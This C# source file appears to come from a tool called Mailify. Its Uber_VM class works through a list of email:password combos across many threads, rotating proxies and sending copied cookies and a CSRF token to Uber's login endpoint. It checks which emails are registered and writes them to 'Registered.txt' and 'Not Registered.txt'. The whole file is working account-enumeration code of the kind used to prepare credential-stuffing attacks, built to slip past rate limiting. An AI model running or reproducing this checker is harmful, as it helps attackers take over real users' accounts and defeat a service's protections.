using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Uber_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    string pre = request.Get("https://auth.uber.com/login/session").ToString();

                    var CSRF = Functions.LR(pre, "csrfToken = '", "'").FirstOrDefault();

                    request.AddHeader("cookie", "_ua=%7B%22id%22%3A%22e51b843a-e3f4-467e-d43e-13e27d3b6d4b%22%2C%22ts%22%3A1615202710611%7D; marketing_vistor_id=" + request.Cookies.GetCookies("https://auth.uber.com/login/session")["marketing_vistor_id"].Value + "; arch-frontend:sess=" + request.Cookies.GetCookies("https://auth.uber.com/login/session")["arch-frontend:sess"].Value +"; _cc=Aci%2FnaLprQtN1lNTt7R%2BtD84; G_ENABLED_IDPS=google; _ua=%7B%22id%22%3A%22e51b843a-e3f4-467e-d43e-13e27d3b6d4b%22%2C%22ts%22%3A1615202710611%7D; CONSENTMGR=c1:1%7Cc2:1%7Cc3:1%7Cc4:1%7Cc5:1%7Cc6:1%7Cc7:1%7Cc8:1%7Cc9:1%7Cc10:1%7Cc11:1%7Cc12:1%7Cc13:1%7Cc14:1%7Cc15:1%7Cts:1615202713175%7Cconsent:true; _ga=GA1.2.356906908.1615202713; _gid=GA1.2.163573821.1615202713; mp_e39a4ba8174726fb79f6a6c77b7a5247_mixpanel=%7B%22distinct_id%22%3A%20%2217811957f3321b-0b30e14ba93e02-53e356a-15f900-17811957f34348%22%2C%22%24device_id%22%3A%20%2217811957f3321b-0b30e14ba93e02-53e356a-15f900-17811957f34348%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _gat_tealium_0=1; _fbp=fb.1.1615202713557.73249600; udi-fingerprint=kCV%2BVEbWK2osYi%2BaCrd%2FT15SyEBvkVpKgZyrOvA4CqdWeZQrZNfBnPJILIoOME8ZckBvy8xUHFix2Y2nql4ZPA%3D%3DmCE0yg0yaXf4bRuDJTDKu98cgVPW9ajapZDVFWoratc%3D; utag_main=v_id:017811957c84001f074954060dbd03073001c06b009dc$_sn:1$_ss:1$_pn:1%3Bexp-session$_st:1615204526958$ses_id:1615202712708%3Bexp-session");
                    request.AddHeader("x-csrf-token", CSRF);
                    string check = request.Post("https://auth.uber.com/login/handleanswer", "{\"answer\":{\"type\":\"VERIFY_INPUT_EMAIL\",\"userIdentifier\":{\"email\":\"" + credentials[0] + "\"}},\"init\":true}", "application/json").ToString();

                    if (check.Contains("FAIL_EMAIL_NOT_FOUND"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (check.Contains("VERIFY_PASSWORD"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}